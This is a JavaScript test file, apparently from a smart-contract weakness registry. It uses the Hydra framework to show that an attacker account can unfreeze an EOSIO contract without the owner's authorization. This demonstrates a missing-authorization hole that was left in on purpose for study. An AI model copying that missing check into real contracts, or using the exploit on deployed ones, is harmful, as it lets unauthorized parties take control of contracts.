const { loadConfig, Blockchain } = require("@klevoya/hydra");

const config = loadConfig("hydra.yml");

describe("wcr-105-2", () => {
  let blockchain = new Blockchain(config);
  let vuln = blockchain.createAccount(`vulnerable`);
  let attacker = blockchain.createAccount(`attacker`);

  beforeAll(async () => {
    vuln.setContract(blockchain.contractTemplates[`wcr-105-2`]);
    vuln.updateAuth(`active`, `owner`, {
      accounts: [
        {
          permission: {
            actor: vuln.accountName,
            permission: `eosio.code`,
          },
          weight: 1,
        },
      ],
    });
  });

  it("can unfreeze the contract without the contract owner's auth", async () => {
    expect.assertions(2);

    // Owner can freeze the contract
    await vuln.contract.freeze();

    expect(vuln.getTableRowsScoped(`freezestatus`)[vuln.accountName]).toEqual([
      {
        frozen: '1'
      },
    ]);

    // attacker can unfreeze the contract
    await vuln.contract.unfreeze(
      {},
      [{ actor: attacker.accountName, permission: `active` }]
    );

    expect(vuln.getTableRowsScoped(`freezestatus`)[vuln.accountName]).toEqual([
      {
        frozen: '0'
      },
    ]);
  });
});